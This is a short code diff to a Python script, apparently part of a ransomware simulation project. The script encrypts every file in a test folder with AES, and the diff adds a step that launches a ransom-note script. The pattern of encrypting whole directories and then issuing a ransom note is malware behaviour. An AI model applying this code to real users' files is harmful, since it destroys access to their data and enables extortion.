@@ -1,6 +1,6 @@
 # where the encryption and decryption will take place
 
-
+import subprocess
 import os
 import json
 from Crypto.Cipher import AES
@@ -42,5 +42,8 @@ def encrypt_file(file_path, key):
 for filename in os.listdir(TEST_FOLDER):
     file_path = os.path.join(TEST_FOLDER, filename)
     encrypt_file(file_path, key)
+
+print("Encryption completed. Generating ransom note...")
+subprocess.run(["python", "ransomeware-sim\\ransom_note.py"])
 
 print("All files successfuly encrypted!")
